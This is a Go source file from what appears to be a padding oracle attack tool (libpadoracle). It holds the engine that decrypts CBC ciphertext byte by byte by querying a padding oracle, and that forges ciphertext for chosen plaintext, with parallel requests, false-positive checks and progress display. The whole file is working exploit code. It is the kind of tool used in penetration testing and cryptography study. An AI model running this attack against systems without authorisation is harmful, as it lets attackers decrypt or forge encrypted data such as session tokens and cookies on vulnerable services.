package libpadoracle

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"log"
	"sync"
	"sync/atomic"
	"time"
	"unicode"

	"github.com/gosuri/uiprogress"
)

type Engine struct {
	Config        *Config
	StandardRange []byte
	PaddedRange   []byte
}

func NewEngine(cfg *Config) *Engine {
	e := &Engine{Config: cfg}
	seen := make(map[byte]bool)
	// Alphanumerics first
	for _, v := range []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") {
		e.StandardRange = append(e.StandardRange, v)
		seen[v] = true
	}
	deprioritized := map[byte]bool{0xff: true, 0xfe: true, 0x01: true, 0x00: true}
	for i := 0; i < 256; i++ {
		b := byte(i)
		if !seen[b] && !deprioritized[b] {
			e.StandardRange = append(e.StandardRange, b)
			seen[b] = true
		}
	}
	for _, b := range []byte{0xff, 0xfe, 0x01, 0x00} {
		if !seen[b] {
			e.StandardRange = append(e.StandardRange, b)
		}
	}

	// Padded range for the last block
	paddedSeen := make(map[byte]bool)
	for p := byte(3); p < byte(cfg.BlockSize); p++ {
		e.PaddedRange = append(e.PaddedRange, p)
		paddedSeen[p] = true
	}
	for _, b := range e.StandardRange {
		if !paddedSeen[b] {
			e.PaddedRange = append(e.PaddedRange, b)
		}
	}
	return e
}

func (e *Engine) GetRangeData(isLastBlock bool) []byte {
	if isLastBlock {
		return e.PaddedRange
	}
	return e.StandardRange
}

type ThreadSafeString struct {
	sync.RWMutex
	str string
}

func (t *ThreadSafeString) Set(s string) {
	t.Lock()
	defer t.Unlock()
	t.str = s
}

func (t *ThreadSafeString) Get() string {
	t.RLock()
	defer t.RUnlock()
	return t.str
}

func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	engine := NewEngine(cfg)
	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil {
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		log.Fatalf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
	}
	endBlock := len(Blocks)
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go engine.PerBlockOperations(&wg2, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}

	wg2.Wait()
}

func Sanitize(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		if v >= 32 && v <= 126 {
			out[i] = v
		} else {
			out[i] = '.'
		}
	}
	return string(out)
}

func (e *Engine) PerBlockOperations(wg *sync.WaitGroup, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	defer wg.Done()
	cfg := e.Config

	strData := &ThreadSafeString{}
	outData := &ThreadSafeString{}
	
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = ' '
	bar.Fill = '='
	bar.Head = '>'
	bar.Width = 20
	bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
	bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

	returnData := Data{}
	decipheredBlockBytes := []byte{}

	rangeData := e.GetRangeData(blockNum == cfg.NumBlocks-1)

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		var nextByte byte
		var found bool

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan int, 1)
			var once sync.Once
			var wg3 sync.WaitGroup

			// Copy decipheredBlockBytes to avoid data race
			decipheredCopy := make([]byte, len(decipheredBlockBytes))
			copy(decipheredCopy, decipheredBlockBytes)

			for _, brute := range rangeData {
				wg3.Add(1)
				threadCh <- struct{}{}
				
				go func(candidate byte, currentByteNum int) {
					strData.Set(fmt.Sprintf(" [%v] Block %v: [%32s] [ '%-16s' ]", cyan.Sprint("*"), y.Sprintf("%02d", blockNum), b.Sprintf("%x", append(append(make([]byte, 0), blockData[:cfg.BlockSize-1-currentByteNum]...), append([]byte{candidate}, decipheredCopy...)...)), Sanitize(append([]byte{candidate}, decipheredCopy...))))
					defer wg3.Done()
					defer func() { <-threadCh }()

					select {
					case <-ctx.Done():
						return
					default:
					}

					if cfg.Sleep > 0 {
						time.Sleep(time.Duration(cfg.Sleep) * time.Millisecond)
					}

					padBlock := BuildPaddingBlock(currentByteNum, cfg.BlockSize)
					searchBlock := BuildSearchBlock(decipheredCopy, candidate, cfg.BlockSize)
					tmp, _ := XORBytes(searchBlock, iv)
					oracleIvBlock, _ := XORBytes(tmp, padBlock)

					RawOracleData := BuildRawOraclePayload(oracleIvBlock, blockData)
					
					atomic.AddUint64(cfg.NumRequests, 1)
					if cfg.Oracle.Call(RawOracleData) {
						// Verification for last block first byte to avoid lucky 0x01
						if blockNum == cfg.NumBlocks-1 && currentByteNum == 0 && candidate != 0x01 {
							// Tamper with the preceding byte (XOR with 1)
							oracleIvBlock[cfg.BlockSize-2] ^= 0x01
							RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
							atomic.AddUint64(cfg.NumRequests, 1)
							if !cfg.Oracle.Call(RawOracleData) {
								atomic.AddUint64(cfg.NumMisses, 1)
								return // False positive
							}
							atomic.AddUint64(cfg.NumHits, 1)
						} else {
							atomic.AddUint64(cfg.NumHits, 1)
						}

						once.Do(func() {
							resultChan <- int(candidate)
							cancel()
						})
					} else {
						atomic.AddUint64(cfg.NumMisses, 1)
					}
				}(brute, byteNum)
			}

			// Sentinel sender
			go func() {
				wg3.Wait()
				once.Do(func() {
					resultChan <- -1
				})
			}()

			res := <-resultChan
			cancel() // ensure context is cancelled

			if res != -1 {
				found = true
				nextByte = byte(res)
			}

			if found {
				if cfg.AsciiMode && blockNum != cfg.NumBlocks-1 && blockNum != 0 {
					if !unicode.IsPrint(rune(nextByte)) && nextByte != '\n' && nextByte != '\r' && nextByte != '\t' {
						rangeData = bytes.ReplaceAll(rangeData, []byte{nextByte}, []byte{})
						found = false
						continue // retry
					}
				}
				break // valid byte found
			} else {
				log.Printf(" [%v] FATAL: No valid bytes found for block %d at byte %d after trying all 256 possibilities.", r.Sprint("!"), blockNum, byteNum)
				log.Printf(" [%v] This usually indicates the oracle is inconsistent or the dummy block is rejected.", r.Sprint("!"))
				log.Panicf("No bytes found for block %d byte %d", blockNum, byteNum)
			}
		}

		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		strData.Set(fmt.Sprintf(" [%v] Block %v: [%32s] [ '%-16s' ]", cyan.Sprint("*"), y.Sprintf("%02d", blockNum), gb.Sprint(hex.EncodeToString(append(make([]byte, cfg.BlockSize-len(decipheredBlockBytes)), decipheredBlockBytes...))), Sanitize(decipheredBlockBytes)))
		bar.Incr()
	}

	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 {
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	outData.Set(fmt.Sprintf(" [%v] Block %d: %v ", gb.Sprint("+"), returnData.BlockNumber, g.Sprint(hex.EncodeToString(returnData.DecipheredBlockData))))

	decipherChan <- returnData
}

func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
	defer wg.Done()
	
	engine := NewEngine(cfg)
	if cfg.IV != nil {
		plainText = append(cfg.IV, plainText...)
	}

	tmp, err := PKCS7(plainText, cfg.BlockSize)
	if err != nil {
		panic(err)
	}
	plainTextChunks := ChunkBytes(tmp, cfg.BlockSize)
	cfg.NumBlocks = len(plainTextChunks)
	
	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)
	cipherTextChunks[len(cipherTextChunks)-1] = bytes.Repeat([]byte{0x41}, cfg.BlockSize)
	
	threadCh := make(chan struct{}, cfg.Threads)
	var nextCt []byte
	for i := len(plainTextChunks) - 1; i >= 0; i-- {
		ct := cipherTextChunks[i+1]
		var out string
		
		strData := &ThreadSafeString{}
		outData := &ThreadSafeString{}

		bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
		bar.Empty = ' '
		bar.Fill = '='
		bar.Head = '>'
		bar.Width = 20
		bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
		bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

		nextCt, out = engine.PerBlockOperationsEncrypt(i, ct, plainTextChunks[i], threadCh, bar, strData)
		outData.Set(out)
		cipherTextChunks[i] = nextCt
	}

	outBytes := []byte{}
	for _, b := range cipherTextChunks {
		outBytes = append(outBytes, b...)
	}
	fmt.Printf("\n [%v] %v\n\n%v\n\n", gb.Sprint("*"), gb.Sprint("FINAL CIPHERTEXT"), white.Sprint(hex.EncodeToString(outBytes)))
}

func (e *Engine) PerBlockOperationsEncrypt(blockNum int, cipherText []byte, plaintText []byte, threadCh chan struct{}, bar *uiprogress.Bar, strData *ThreadSafeString) (iv []byte, outData string) {
	cfg := e.Config
	intermediateState := make([]byte, cfg.BlockSize)

	rangeData := e.GetRangeData(false)

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		var nextByte byte
		var found bool

		// Prepare the IV suffix for the current padding level (byteNum + 1)
		// These are the bytes to the right of the one we are currently guessing.
		ivSuffix := make([]byte, byteNum)
		for i := 0; i < byteNum; i++ {
			// index: BS-byteNum, BS-byteNum+1 ... BS-1
			intermediateIdx := cfg.BlockSize - byteNum + i
			ivSuffix[i] = intermediateState[intermediateIdx] ^ byte(byteNum+1)
		}
		
		// Copy for thread-safe UI access
		uiIntermediate := make([]byte, cfg.BlockSize)
		copy(uiIntermediate, intermediateState)

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan int, 1)
			var once sync.Once
			var wg3 sync.WaitGroup

			for _, brute := range rangeData {
				wg3.Add(1)
				threadCh <- struct{}{}
				
				go func(candidate byte, currentByteNum int) {
					defer wg3.Done()
					defer func() { <-threadCh }()

					select {
					case <-ctx.Done():
						return
					default:
					}

					if cfg.Sleep > 0 {
						time.Sleep(time.Duration(cfg.Sleep) * time.Millisecond)
					}

					// searchBlock = [0...0, candidate, ivSuffix...]
					searchBlock := make([]byte, cfg.BlockSize)
					if len(ivSuffix) > 0 {
						copy(searchBlock[cfg.BlockSize-len(ivSuffix):], ivSuffix)
					}
					searchBlock[cfg.BlockSize-1-currentByteNum] = candidate
					
					strData.Set(fmt.Sprintf(" [%v] Block %v: [%32s] [ '%-16s' ]", cyan.Sprint("*"), y.Sprintf("%02d", blockNum), b.Sprintf("%x", searchBlock), Sanitize(uiIntermediate[cfg.BlockSize-currentByteNum:])))

					RawOracleData := BuildRawOraclePayload(searchBlock, cipherText)
					
					atomic.AddUint64(cfg.NumRequests, 1)

					if cfg.Oracle.Call(RawOracleData) {
						// Padding verification
						if currentByteNum == 0 && candidate != 0x01 {
							searchBlock[cfg.BlockSize-2] ^= 0x01
							RawOracleData = BuildRawOraclePayload(searchBlock, cipherText)
							atomic.AddUint64(cfg.NumRequests, 1)
							if !cfg.Oracle.Call(RawOracleData) {
								atomic.AddUint64(cfg.NumMisses, 1)
								return
							}
							atomic.AddUint64(cfg.NumHits, 1)
						} else {
							atomic.AddUint64(cfg.NumHits, 1)
						}

						once.Do(func() {
							resultChan <- int(candidate)
							cancel()
						})
					} else {
						atomic.AddUint64(cfg.NumMisses, 1)
					}
				}(brute, byteNum)
			}

			go func() {
				wg3.Wait()
				once.Do(func() {
					resultChan <- -1
				})
			}()

			res := <-resultChan
			cancel()

			if res != -1 {
				found = true
				nextByte = byte(res)
			}

			if found {
				break
			} else {
				log.Printf(" [%v] FATAL: No valid bytes found for block %d at byte %d after trying all 256 possibilities.", r.Sprint("!"), blockNum, byteNum)
				log.Printf(" [%v] This usually indicates the oracle is inconsistent or the dummy block is rejected.", r.Sprint("!"))
				log.Panicf("No bytes found for encrypt block %d byte %d", blockNum, byteNum)
			}
		}

		// intermediate = IV_byte ^ padding_value
		intermediateState[cfg.BlockSize-1-byteNum] = nextByte ^ byte(byteNum+1)
		
		strData.Set(fmt.Sprintf(" [%v] Block %v: [%32s] [ '%-16s' ]", cyan.Sprint("*"), y.Sprintf("%02d", blockNum), gb.Sprint(hex.EncodeToString(intermediateState)), Sanitize(intermediateState[cfg.BlockSize-1-byteNum:])))
		bar.Incr()
	}

	iv, _ = XORBytes(intermediateState, plaintText)
	outData = fmt.Sprintf(" [%v] Block %d: %v ", gb.Sprint("+"), blockNum, g.Sprint(hex.EncodeToString(iv)))
	return iv, outData
}
